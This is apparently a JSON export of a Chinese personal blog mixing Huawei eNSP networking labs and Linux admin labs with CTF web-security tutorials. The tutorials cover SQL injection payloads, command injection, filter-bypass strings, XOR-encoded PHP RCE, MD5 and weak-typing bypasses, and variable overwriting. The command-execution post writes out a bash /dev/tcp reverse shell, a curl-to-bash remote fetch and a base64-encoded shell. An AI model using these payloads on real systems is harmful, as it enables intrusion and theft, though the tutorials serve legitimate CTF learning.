{"posts":[{"title":"选拔考试例题-eNSP","content":"选拔考试例题-eNSP 网络拓扑： 要求说明： 按拓扑配置主机名和IP地址 总公司配置单臂路由使VLAN互通，子接口ID和VLAN ID一致，IP地址网络第一个可用地址，做相应的配置 分公司配置三层交换使VLAN间互通，VLANIF 的IP地址网络第一个可用地址，三层交换机使用VLANIF 100和R2通信，做相应配置 R1、R2和3LSW 配置OSPF路由协议使全网互通 测试PC机之间的连通性 实验步骤 基础配置： 首先按照拓扑显示，为每台设备设置名称和IP AR1： system-view sysname AR1 AR2： system-view sysname AR2 3LSW： system-view sysname 3LSW SW1： system-view sysname SW1 SW2： system-view sysname SW2 按照题意可得知，每个VLAN的网关为此网段的第一个可用IP PC1： 192.168.10.1 PC2： 192。168.20.1 PC3： 172.16.30.1 PC4： 172.16.40.1 总公司-单臂路由： SW1： vlan batch 10 20 int g0/0/11 port link-type access port default vlan 10 int g0/0/12 port link-type access port default vlan 20 int g0/0/1 port link-type trunk port trunk allow-pass vlan all AR1： int g0/0/0.10 ip add 192.168.10.1 24 //配置网关 dot1q termination vid 10 //配置VLAN ID arp broadcast enable //开启子接口 int g0/0/0.20 ip add 192.168.20.1 24 dot1q termination vid 20 arp broadcast enable 测试： //PC1 PING PC2 PC&gt;ping 192.168.20.2 Ping 192.168.20.2: 32 data bytes, Press Ctrl_C to break From 192.168.20.2: bytes=32 seq=1 ttl=127 time=62 ms From 192.168.20.2: bytes=32 seq=2 ttl=127 time=78 ms From 192.168.20.2: bytes=32 seq=3 ttl=127 time=78 ms From 192.168.20.2: bytes=32 seq=4 ttl=127 time=63 ms From 192.168.20.2: bytes=32 seq=5 ttl=127 time=78 ms --- 192.168.20.2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 62/71/78 ms 分公司-三层VLAN间互通： SW2： vlan batch 30 40 int g0/0/3 port link-type access port default vlan 30 int g0/0/4 port link-type access port default vlan 40 int g0/0/1 port link-type trunk port trunk allow-pass vlan all 3LSW： vlan batch 30 40 int g0/0/2 port link-type trunk port trunk allow-pass vlan all int vlanif 30 ip add 172.16.30.1 24 int vlanif 40 ip add 172.16.40.1 24 测试： //PC3 PING PC4 PC&gt;ping 172.16.40.1 Ping 172.16.40.1: 32 data bytes, Press Ctrl_C to break From 172.16.40.1: bytes=32 seq=1 ttl=255 time=47 ms From 172.16.40.1: bytes=32 seq=2 ttl=255 time=47 ms From 172.16.40.1: bytes=32 seq=3 ttl=255 time=47 ms From 172.16.40.1: bytes=32 seq=4 ttl=255 time=31 ms From 172.16.40.1: bytes=32 seq=5 ttl=255 time=31 ms --- 172.16.40.1 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 31/40/47 ms OSPF全网互通： 3LSW： vlan batch 100 int vlanif 100 ip add 2.2.2.2 30 int g0/0/1 port link-type access port default vlan 100 AR2： int g0/0/0 ip add 2.2.2.1 30 测试： //3LSW PING AR2 ping 2.2.2.1 PING 2.2.2.1: 56 data bytes, press CTRL_C to break Reply from 2.2.2.1: bytes=56 Sequence=1 ttl=255 time=80 ms Reply from 2.2.2.1: bytes=56 Sequence=2 ttl=255 time=50 ms Reply from 2.2.2.1: bytes=56 Sequence=3 ttl=255 time=50 ms Reply from 2.2.2.1: bytes=56 Sequence=4 ttl=255 time=40 ms Reply from 2.2.2.1: bytes=56 Sequence=5 ttl=255 time=10 ms --- 2.2.2.1 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 10/46/80 ms 以上两步是为了三层交换机与路由器进行通信，接下来进行OSPF配置，使全网互通 3LSW： ospf area 0 net 172.16.30.0 0.0.0.255 //宣告网络 net 172.16.40.0 0.0.0.255 net 2.2.2.0 0.0.0.3 AR2： int g0/0/1 ip add 1.1.1.2 30 ospf area 0 net 1.1.1.0 0.0.0.3 net 2.2.2.0 0.0.0.3 AR3： int g0/0/1 ip add 1.1.1.1 30 ospf area 0 net 1.1.1.0 0.0.0.3 测试： //PC1 PING PC3 PC&gt;ping 172.16.30.2 Ping 172.16.30.2: 32 data bytes, Press Ctrl_C to break Request timeout! From 172.16.30.2: bytes=32 seq=2 ttl=125 time=109 ms From 172.16.30.2: bytes=32 seq=3 ttl=125 time=125 ms From 172.16.30.2: bytes=32 seq=4 ttl=125 time=94 ms From 172.16.30.2: bytes=32 seq=5 ttl=125 time=62 ms --- 172.16.30.2 ping statistics --- 5 packet(s) transmitted 4 packet(s) received 20.00% packet loss round-trip min/avg/max = 0/97/125 ms //PC4 PING PC1 PC&gt;ping 192.168.10.2 Ping 192.168.10.2: 32 data bytes, Press Ctrl_C to break From 192.168.10.2: bytes=32 seq=1 ttl=125 time=109 ms From 192.168.10.2: bytes=32 seq=2 ttl=125 time=94 ms From 192.168.10.2: bytes=32 seq=3 ttl=125 time=109 ms From 192.168.10.2: bytes=32 seq=4 ttl=125 time=94 ms From 192.168.10.2: bytes=32 seq=5 ttl=125 time=94 ms --- 192.168.10.2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 94/100/109 ms 实验总结： 在本次实验中主要考核单臂路由、三层交换机VLAN间通信和OSPF路由协议 实验文件下载 ：网络设备配置与安全 ","link":"https://Xing-Fax.GitHub.io/post/selection-ensp/"},{"title":"CTF WEB SQL-报错注入","content":"SQL-报错注入 报错注入在没办法使用union联合查询的时候使用，前提是不能过滤一些关键的函数 Updatexml() select * from users where username='admin' and updatexml(1,concat(0x7e,(select ()user)),0x7e),1); //回显 ERROR 1105(HY000): XPATH syntax error: '~root@localhost~' 可以看到，select uaer() 被成功查询，并将结果展示在了报错信息中，在MySQL中可以使用十六进制表示对应的字符串 Extractvalue() extractvalue(1,concat(0x7e,(select user()),0x7e)) 与updatexml()利用方法类似 截取回显 报错信息回显通常会有字符限制，长度超出的部分被丢去，我们可以使用substr函数进行一个截取，如下 extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(card_passwd) from teacher),20))))%23 %23为URL编码中的#号 sqlmap 待更新... ","link":"https://Xing-Fax.GitHub.io/post/errorinject/"},{"title":"CTF WEB SQL注入-联合注入","content":"SQL注入-联合注入 &lt;?php if( isset( $_REQUEST[ 'Submit' ] ) ) { // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 这个是一段有漏洞的代码，从用户请求中获取id参数，直接将id参数带入SQL语句进行查询，最后输出结果 可以看到，代码并未对id参数做任何的过滤和检查，因此可以向id中构造特殊语句来达到我们想要的结果 $id = &quot;1&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' 正常情况下，传入参数&quot;1&quot;，表示查询ID为&quot;1&quot;用户数据 字符还是数字 在SQL注入测试中，我们会先判断注入的查询字段是字符型还是数字型，可以输入如下语句，判断用户输入查询参数是否被单引号包裹 $id = &quot;1' and '1' = '2&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '2' 我们要使判断恒为真，然后列出表中所有数据，可以使用 “OR”，执行后将列出此表所有数据，说明注入生效 $id = &quot;1' or '1' = '1&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1' 确定字段数量 接下来我们要开始猜测查询语句中的字段数 $id = &quot;1' or 1 = 1 order by 1 #&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' or 1 = 1 order by 1 #' #号在SQL中表示注释，在此语句中末尾多出一个单引号，这个是我们不想要的，使用 “--”也可以注释 order by 是指依照输出字段的第几列进行排序 我们可以依次对order by后的参数做刚刚，从 1 开始，假如order by 3执行后出现报错，那么说明此语句中只显示两个字段的数据 确定字段顺序 通常我们并不知道查询中的那些字段被输出，而那些字段没有被输出，所以我们可以通过union确定字段顺序 $id = &quot;1' union select 1,2 #&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2 #' union表示联合查询，可以将多条SQL查询语放到一条查询语句中，要保证两个查询的字段数相同 通过观察那一列的数字被输出了，说明该字段是被回显的字段，没有就代表该字段并没有回显 因此我们在后续注入中要保证两个查询的字段数相同 获取数据库名 $id = &quot;1' union select 1,database() #&quot;; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;; //SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,database() #' database()是MySQL封装的一个函数，用于返回当前数据库名称 获取数据表名 '1' unino select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #' group_concat()函数的作用是将查询的数据拼接到一行输出，以逗号分隔，table_name为字段名称 在MySQL中可以把information_schema看作一个数据库，其中保存着MySQL服务器维护的所有数据库信息 获取表中字段列表 '1' unin select 1,gtoup_concat(column_name) from information_schema.columns where table_name='users' # 将users表中的所有字段名称以逗号为分割放到一行输出 在CTF中，回显结果可能会受到限制，如只回显第一条数据，我们可以让前一个查询的结果为空 '1' and 1=2 unin select 1,gtoup_concat(column_name) from information_schema.columns where table_name='users' # 如果group_concat函数被过滤，我们可以使用limit，如limit 5,1 表示从第五行输出一行数据 这样可以保证回显的第一条数据就是我们后面拼接的查询语句结果 查询数据 '1' or 1=1 union select group_concat(user_id,firat_name,last_name),group_concat(password) from users # 最后根据我们上面获取到的所有信息来对表就行一个数据查询，得到自己想要的数据 ","link":"https://Xing-Fax.GitHub.io/post/jointinjec/"},{"title":"CTF WEB 命令执行漏洞","content":"命令执行漏洞 1. 程序过滤不严，导致用户可以将代码注入并执行 **高危函数：**eval()、assert()、preg_replace()、call_user_func()等等... 2. 对于执行命令的函数，参数过滤不严谨，导致直接命令执行 **高危函数：**system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()等等... 反引号是shell_exec()的别名，如echo `ls` 代表执行ls命令 &lt;?php $username = $_GET['username']; system(&quot;mkdir $username&quot;); ?&gt; 正常情况下用户传入adc，系统就会执行“mkdir abc”命令，去创建一个文件夹 但是如果传入参数为“abc;ls”，那么在创建文件夹后会执行&quot;ls&quot;命令，因为 ”;“ 分号为命令拼接，将两条命令放到一行当中去执行 cp /tmp/sourcefile /app/public/#{userinput}.png 如上述例子中通过传入&quot;abc.png;ls;&quot;，就会导致额外的命令执行 执行权限 执行系统命令继承Web server用户权限，Web服务器用户为www-data 在awd比赛中，通常会给你一个能够连接ssh的用户，例如ctf、test、user，如果别人给你服务器种上了木马，而你使用连接ssh的用户通常无法删除，因为所属用户组不同，因此没有权限 通常解决方法为给自己服务器写入木马，然后通过蚁剑类远程执行命令工具来去删除对方木马 另一种是不死马，不死马会在内存中不断运行，每间隔一段时间如一秒，向主机重新写入木马，解决方法为通过蚁剑连接到自己主机，执行”kill -9 -1“命令，结束当前用户所有的进程 如果说是通过调用系统命令执行&quot;sh busima.sh&quot;、&quot;php busima.php&quot;等命令，可以通过执行 ps -ef | grep busima.sh 找到进程PID，然后通过&quot;kill -9 pid &lt;PID&gt;&quot;结束进程 例子 &lt;?php if(isset($_GET['ip'])){ $ip = $_GET['ip']; echo shell_exec(&quot;ping - c 4&quot; . $ip); } else{ highlight_file(__FILE__); } ?&gt; PHP中的点'.'代表字符串拼接 通过拼接命令参数，导致的额外命令执行，如执行“ls -l”命令 GET: http://localhost/test.php?ip=127.0.0.1;ls%20-l 联合执行 cmd1;cmd2;cmd3 命令从头往后依次执行，无论前一条命令是否执行成功，都不会影响后面的命令执行 cmd1&amp;cmd2&amp;cmd3 使用逻辑和&amp;&amp;，如果前一条命令出现错误时，将会停止执行后面的命令 cmd1||cmd2||cmd3 使用逻辑或||，如果前一条命令执行失败，才会执行后面的命令 echo 'abc' | md5 使用管道符|，会将前一条命令的结果作为后一条命令的输入 %0a %0d 换行和回车符 无回显问题 通常在远程计算机执行命令后都会返回命令结果，但是也可能没有返回结果，也叫无回显 反弹shell nc -lvp &lt;port&gt; 在自己服务器中监听反弹的端口号 bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1 在远程计算机上执行如上命令，即可完成shell反弹 此命令也有可能无法执行成功，可以将命令保存在自己服务器中的一个txt文档中，使用管道符来执行命令，如下 curl http://localhost/shell.txt | bash 也可以通过将命令进行base64编码来执行，如下 echo YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx | base64 -d | bash ","link":"https://Xing-Fax.GitHub.io/post/command/"},{"title":"CTF WEB 绕过过滤","content":"绕过过滤 为了防止命令执行漏洞的发生，网页端通常会对请求做严格的过滤，通常都是针对于关键字的过滤，如过滤空格、过滤关键字等等 绕过空格 cat$IFS$9flag.php cat${IFS}flag.php cat&lt;flag.php cat&lt;&gt;flag.php {cat,flag.php} %20 //空格URL编码 %09 //制表位 绕过关键字 ca\\t fla\\g.php //转义符绕过 cat fl''ag.php //拼接过滤 echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash //base64绕过 echo &quot;6361742066616c672e706870&quot; | xxd -r -p | bash //HEX绕过 cat flag.* //通配符绕过 cat fla?.php cat fla[f-h].php cat fla[f..h].php cat `ls | grep fla` //内联执行绕过 cat $(ls | grep fla) $a=fl;$b=ag;cat $a$b.php //变量绕过 ","link":"https://Xing-Fax.GitHub.io/post/filter/"},{"title":"CTF WEB 苛刻条件RCE","content":"苛刻条件RCE &lt;?php if(isset($_GET['code'])){ $code = $_GET['code']; if(preg_match(&quot;/[a-z0-9]+/i&quot;,$code)){ die(&quot;NO.&quot;); } eval($code); }else{ highlight_file(__FILE__); } 在上述代码中，对传入参数“code”进行了严格的过滤，参数中不能出现字母和数字(含大小写) 可以使用PHP中的位运算来对参数进行异或处理 &lt;?php $a = &quot;&lt;str&gt;&quot;; //要异或的字符串 for($i = 0; $i &lt; strlen($a); $i++){ echo &quot;%&quot;.dechex(ord($a[$i])^0xff); } echo &quot;^&quot;; for($i = 0; $i &lt; strlen($a); $i++){ echo &quot;%ff&quot;; } ?&gt; 通过以上代码将&quot;system(ls)&quot;运算为 (%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff); GET: http://localhost/test.php?code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff); 同理，通过取反也可以达到相同效果 &lt;?php $a = &quot;&lt;str&gt;&quot;; //要取反的字符串 echo &quot;~(&quot;; for($i = 0;$i &lt; strlen($a); $i++){ echo &quot;%&quot;.bin2hex(~$a[$i]); } echo &quot;)&quot;; ?&gt; http://localhost/test.php?code=(~(%8c%86%8c%8b%9a%92))(~(%93%8c)); Create_Function create_function()函数有两个参数args和args和args和code，用于创建一个lambda样式的函数 &lt;?php error_reporting(0); $f = create_function('$a, $b', 'return($a + $b);'); echo $f(1,2); // 3 但是在创建函数的过程中存在一个代码注入 $code = &quot;return($a + $b);}eval($_POST['Y1']);//&quot; $f = create_function('$a, $b', $code); 相当于得到 function f($a, $b){ return($a + $b); } eval($POSY['Y1']);//} 在注入的过程中，先使用 } 闭合函数体，在写入注入自己的代码，由于末尾多出一个 } 所以使用注释符注释掉 例题 &lt;?php error_reporting(0); //flag.php if(Isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code) &gt; 18){ die(&quot;No,1&quot;); } if(preg_match(&quot;/\\w/&quot;,$code)){ die(&quot;NO,2&quot;); } if(preg_match(&quot;/&amp;||\\||\\^|\\~|\\!/&quot;,$code)){ die(&quot;NO,3&quot;); } if(preg_match(&quot;/\\(|\\)/&quot;,$code)){ die(&quot;NO,4&quot;); } if(preg_match(&quot;/|{|\\}|\\[|\\]/&quot;,$code)){ die(&quot;NO,5&quot;); } if(preg_match(&quot;/||$|@|\\./&quot;,$code)){ die(&quot;NO,6&quot;); } eval($code); }else{ show_source(__FILE__); } ?&gt; GET: http://localhost/test.php?code=?&gt;&lt;?=`/???/???%20*`; &quot;?&gt;&quot; 表示PHP的结束符，而“&lt;?=”表示下一个PHP的开始“=”表示echo回显，反引号表示shell__exec() ?表示单个长度的字符，*表示所有字符，能够匹配到的路径为“/bin/cat *” echo shell_exec(&quot;/???/??? *&quot;) // /bin/cat flag.php ","link":"https://Xing-Fax.GitHub.io/post/harsh/"},{"title":"CTF WEB MD5绕过","content":"MD5绕过 登录的哈希验证 $a != $b md5($a) == md5($b) 0E绕过 让两个变量不相等，但md5却相等，可以通过计算0e开头的md5来进行绕过 var_dump(md5(&quot;s878926199a&quot;)); //0e545993274517709034328855841020 var_dump(md5(&quot;s155964671a&quot;)); //0e342768416822451524974117254469 因为md5函数返回值为字符串，返回字符串开头都带有0e，并且使用了”==“做判断 所以字符串会被转化为数值0，0 == 0条件成立 数组绕过 如果并没有使用弱类型&quot;&quot;来判断，而是采用强类型&quot;=&quot;来判断，要如何绕过呢 $a != $b md5($a) === md5($b) 在md5函数传参中，第一个参数应该是一个字符串，但是如果传入数组则会抛出异常，返回null 所以null === null条件成立 GET传入数组方式： http://localhost/test.php?a[]=123&amp;a[]=456 碰撞绕过 如果两个变量强转字符串呢，这个时候就只能使用md5碰撞进行绕过 (string)$a != (string)$b md5($a) === md5($b) 两个不同的东西，有相同的md5值 HEX样本： 0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef 0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef 以上两端数据的md5值均为&quot;cee9a457e790cf20d4bdaa6d69f01e41&quot; 例题 &lt;?php if(isset($_GET['md5'])){ $md5 = $_GET['md5']; if ($md5 == md5($md5)){ echo &quot;flag&quot; } } ?&gt; 由于使用的是弱类型”==“判断，所以我们需要一个”0e“开头的字符串并且md5值也是“0e”开头 0e00275209979 -&gt; 0e551387587965716321018342879905 0e00506035745 -&gt; 0e224441551631909369101555335043 GET: http://localhost/test.php?md5=0e00275209979 ","link":"https://Xing-Fax.GitHub.io/post/md5/"},{"title":"CTF WEB PHP弱类型","content":"PHP弱类型 在PHP中，可能会需要比较两个值或者变量是否相等，可以使用&quot;&quot;和&quot;=&quot;来完成比较，但是他们之间存在一定的差别 “==”操作符 var_dump(&quot;4&quot; == 4); //true 在使用“==”进行比较时，PHP会将字符串转化为同类型再进行比较 “===”操作符 var_dump(&quot;4&quot; === 4); //false 在使用“===”进行比较时，PHP会先判断类型是否相等，再进行比较 例子 &lt;?php var_dump(&quot;admin&quot; == 0); //true var_dump(&quot;1admin&quot; == 1); //true var_dump(&quot;admin1&quot; == 1); //false var_dump(&quot;admin1&quot; == 0); //true var_dump(&quot;admin1&quot; == 0); //true var_dump(&quot;0e123&quot; == &quot;0e456&quot;)//true ?&gt; 在PHP进行类型转换的时候，会从字符串第一位依次向后判断是否为数字，如果true则保留，false结束判断 &quot;admin&quot; -&gt; 0 第一位不为数字而是字母，所以判断结束，值为int的初始值0 &quot;1admin&quot; -&gt; 1 第一位为数字保留，第二位不是数字，结束判断，值为1 &quot;123a456789&quot; -&gt; 123 在判断到不为数字的位时，结束判断，所以后面的值不在进行判断 &quot;0e123&quot; -&gt; 0 此字符串属于特殊字符串，为科学计数法的表达方式，所以会被转化为具体数值 0*10^123 = 0 &lt;?php var_dump(1 + &quot;1.5&quot;); //2.5 var_dump(1 + &quot;-1.3e3&quot;); //-1299 var_dump(1 + &quot;src123e5&quot;); //1 var_dump(1 + &quot;2admin&quot;); //3 var_dump(1 + &quot;admin2&quot;); //1 ?&gt; 当字符串中没有包含‘.’、‘e’、'E'，且值小于int范围，会被作为int来取值，其余情况会作为浮点数来取值 案例 &lt;?php if(isset($_POST['message'])){ $message = json_decode($POST['message']); $key = &quot;******&quot;; //保密 if($message-&gt;key == $key){ echo &quot;flag&quot;; } else{ echo &quot;fail&quot;; } } else{ echo &quot;~~~&quot;; } ?&gt; 在上述案例中，已知有POST参数message，通过传入的值和变量key做比较，相等时得到flag 变量Key中的值我们不知道，但是它的类型为字符串，并且使用‘’==‘做判断符，所以我们猜测一下此字符串中第一位不包含数字，不包含数字的话做类型转换就是0，所以我们POST传入一个整形0得到flag POST: message={&quot;key&quot;:0} 如果字符在转换后不是0是数字呢？可以采用脚本爆破的方式从1到9999全部试一遍，得到flag ","link":"https://Xing-Fax.GitHub.io/post/type/"},{"title":"CTF WEB 变量覆盖","content":"变量覆盖 使用传参的值替换掉原有的变量值 $a = 'abc'; $a = 'def'; 如以上两句代码，变量a最终的值为“def”而不是”abc“因为被重新赋值所以原值被覆盖了 在PHP中可以使用如下函数进行变量替换 extract() parse_str() import_requests_variables() //PHP &gt;= 5.4.0 被弃用 Extract 此函数使用数组的建作为变量名称，值作为变量的值，争对每数组中的每一个元素 &lt;?php $a = &quot;Origunal&quot;; $my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;, &quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;); extract($my_array); echo &quot;\\$a = $a; \\$b = $b; \\c = $c&quot; ?&gt; extract函数执行后会依次创建’a‘、’b‘、‘c’三个变量此时，因为程序开头已经存在变量a，所以变量a的值被重新赋值为”Cat“，被覆盖掉了，所以最后的执行结果为 $a = Cat; $b = Dog; $c = Horse 例子 &lt;?php $arr = $_GET['arr']; extract($arr); @$d($POST['a']); ?&gt; 在此例中，通过对变量b进行覆盖，并将a的值替换为要执行的命令，最后完成任意命令执行 GET: http://localhost/test.php?arr[d]=system POST: a=ls Parse_str &lt;?php parse_str(&quot;name=Bill&amp;age=60&quot;); echo $name; echo $age; ?&gt; 将查询字符串解析到变量中 &lt;?php parse_str(&quot;name=Bill&amp;age=60&quot;,$myArray); print_r($myArry); ?&gt; 将查询字符串解析到变量中 例子 &lt;?php $arr = $_GET['arr']; parse_str($arr); @$d($POST['a']); ?&gt; GET: http://localhost/test.php?arr=d=system POST: a=ls 例题 &lt;?php if(!isset($_GET['id'])){ show_source(__FILE__); die; } include_once('flag.php'); $a = 'TESTCTF'; $id = $_GET['id']; @parse_str($id); if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')){ die($flag); } else{ die('emmm'); } ?&gt; 题目中只有一个Get参数id，在下方的if条件中是对a进行判断，所以要对变量a进行覆盖 题目中采用parse_str()函数解析变量，后方的字符串”QNKCDZO“的Md5为0e开头，而且采用的弱类型 所以先将变量a进行覆盖，再将数组a[0]的值设置为”0e00275209979“ GET: http://localhost/test.php?a[0]=0e00275209979 ","link":"https://Xing-Fax.GitHub.io/post/variable/"},{"title":"Linux磁盘管理实验","content":"磁盘管理实验 实验环境 公司原来安装的RHEL8服务器采用了自动分区的方案，随着使用服务器的系统用户数量不断增多，根分区经常面临磁盘空间耗尽的情况，偶尔有几次还导致系统无法启动。为了解决这些问题，现需要为服务器新增加一块SCSI磁盘，并将用户目录“/home”中的数据迁移到该磁盘中，要求迁移后不能影响原有用户账号的使用。 需求描述 在虚拟机中添加一块80GB的SCSI磁盘。 在新磁盘中建立一个20GB的分区，用于存放所有普通用户的宿主文件夹。 新建的分区仍然挂载到“/home”目录下，需要导入系统中原有用户的数据。 服务器每次开机后能够自动挂载该分区。 附加 增加交换分区swap空间 创建2G大小的分区 类型修改为82 mkswap 编辑/etc/fstab swapoff –a;swapon –a swapon –s Free 完成上述实验，并给出截图 实验步骤 在虚拟机中添加80Gb的SCSI磁盘，然后查看磁盘设备 使用Fdisk命令创建一个20G的主分区 输入fdisk -l查看刚刚创建的20G分区 对新分区进行格式化操作 对原home目录进行备份 将20G磁盘挂载到/home目录 将备份的数据导入到/home中 设置开机自动挂载 输入reboot重启系统，查看是否开机自动挂载 ​ 成功自动挂载！ 附加 创建2G磁盘空间 修改分区类型为82(交换空间) 格式化分区 实现自动挂载 激活配置 ","link":"https://Xing-Fax.GitHub.io/post/scsi/"},{"title":"Linux应用程序安装","content":"应用程序安装 通过RPM安装VSFTPD，同时查看软件信息并截图 通过YUM安装GCC软件，并查看GCC版本号，截图为准 通过DNF安装HTTPD软件，将成果截图 1.安装VSFTPD，查看软件信息 mount /dev/cdrom /mnt cd /mnt/AppStream/Packages rpm -ivh vsftpd-3.0.3-28.el8.x86_64.rpm 查看软件信息 rpm -qi vsftpd 2.安装GCC，查看软件信息 cd /etc/yum.repos.d touch server.repo vim server.repo yum -y install gcc 查看GCC版本号 gcc --version 3.通过DNF安装HTTPD软件 yum install dnf dnf install httpd ","link":"https://Xing-Fax.GitHub.io/post/app/"},{"title":"Linux用户和组管理实验","content":"Linux用户和组管理实验 实验环境： 公司的Linux主机即将提供给技术部作为开发服务器使用，根据部门内项目组的构成情况，首先需要建立相应的组账号、用户账号，并为相关目录设置权限；还需要设置一个共用的数据存储目录，便于同事之间的数据交换。 需求描述： 建立用户目录 创建目录/tech/team1和/tech/team2，分别用于存放各项目组中用户账号的宿主文件夹 例如natasha用户的宿主目录位于/tech/team1 添加组账号 为技术部添加组账号tech，GID设置为2000 为两个项目组添加组账号team1、team2，GID分别设置为2001、2002 添加用户账号 team1组包括三个用户，分别为natasha，harry、sarah，宿主目录均使用/tech/team1目录中与账号同名的文件夹，其中natash账号设为2023年12月31日后失效 team2组包括两个用户，分别为kitty和mary，宿主目录均使用/tech/team2目录中与账号同名的文件夹 ​ 用户的初始密码设置为redhat 创建目录和归属 将/tech目录的属组设置为tech，去除其他用户的所有权限 将/tech/team1目录的属组设置为team1，去除其他用户的所有权限 将/tech/team2目录的属组设置为team2，去除其他用户的所有权限 建立公共数据存储目录 创建/public目录，允许所有技术部组内的用户读取、写入、执行文件，非技术部组内的用户禁止访问此目录。 完成上述实验，并给出截图 实验过程 建立用户目录： 分别创建**/tech/team1与/tech/team2**目录 mkdir -p /tech/{team1,team2} 添加组账号： 技术组账号tech，GID为2000，项目组账号team1、team2，GID为2001、2002 groupadd -g 2000 tech groupadd -g 2001 team1 groupadd -g 2002 team2 添加用户账号 为team1组创建账号并添加 useradd -d /tech/team1/natasha -g team1 -e 2023-12-31 natasha useradd -d /tech/team1/harry -g team1 harry useradd -d /tech/team1/sarah -g team1 sarah 创建初始密码：redhat passwd natasha passwd harry passwd sarah 为team2组创建账号并添加 useradd -d /tech/team2/kitty -g team2 -G tech kitty useradd -d /tech/team2/mary -g team2 -G tech mary 创建初始密码：redhat passwd kitty passwd mary 创建目录和归属： 将/tech目录的属组设置为tech，去除其他用户的所有权限 chown :tech /tech chmod 750 /tech 将/tech/team1目录的属组设置为team1，去除其他用户的所有权限 chown :team1 /tech/team1 chmod 750 /tech/team1 将/tech/team2目录的属组设置为team2，去除其他用户的所有权限 chown :team2 /tech/team2 chmod 750 /tech/team2 建立公共目录： 创建目录并设置要求权限 mkdir /public chown :tech /pulic chmod 770 /public 验证上述配置 因为tech技术组内并没有用户，所以先向tech组中添加两名用户分别为test1、test2 验证目录归属： tech组内用户可以访问/tech目录，但是不能访问/tech/team1和/tech/team2目录 验证公共存储目录： tech组内用户可以创建、写入和执行文件 验证其他用户是否可以访问公共目录： team1与team2组内用户均无法访问/public目录 存在问题&amp;解决方法 宿主目录权限问题： 因为/tech目录的所属组为tech，并为其他用户去除了所有权限，因此team1组和team2组内用户无法访问到自己的宿主目录 解决方法： 将/tech目录权限设置为751，即其他用户拥有执行权限 team1和team2组内用户可以访问自己的宿主目录 文删除权限问题： 因为/public目录被设置为test组内用户拥有所有权限，所以组内其他用户可以删除或者修改组内其他用户的文件 解决方法： 将/public文件夹权限设置为1770 chmod 1770 /public 这样组内用户只能对自己创建的文件进修改操作，而没有权限修改组内其他用户创建的文件 ","link":"https://Xing-Fax.GitHub.io/post/usermanagement/"},{"title":"eNSP-MSTP实验","content":"MSTP实验： 实验要求： 交换机创建VLAN 10 20 30 40，级联端口配置成Trunk，PC连接的端口加入相应的VLAN 设置STP的模式MSTP，配置域名smx,VLAN 10,20加入实例1，VLAN30,40加入实例2 S1配置成实例1的主根，实例2的次根，S2配置成实例2的次根，实例1的主根 实验步骤： 每台交换机创建VLAN 10 20 30 40，并将交换机级联端口设置为Trunk，并允许创建的四个VLAN通过，PC机连接的端口设置为Access，并加入相应VLAN ... VLAN Batch 10 20 30 40 ... Port Link-Type Trunk Port Trunk Allow-Pass Vlan 10 20 30 40 ... Port Link-Type Access port default Vlan [10 | 20 | 30 | 40] ... 激活MSTP域配置，配置域名&quot;smx&quot; STP Region-Configuration Region-name smx 将VLAN 10 20 加入实例1，VLAN 30 40 加入实例2，并对MSTP配置进行保存 instance 1 vlan 10 20 instance 2 vlan 30 40 Active Region-Configuration 配置MSTP协议 STP Mode MSTP 配置主次根桥 S1: STP Instance 1 Root Primary STP Instance 2 Root Secondary S2: STP Instance 1 Root Secondary STP Instance 2 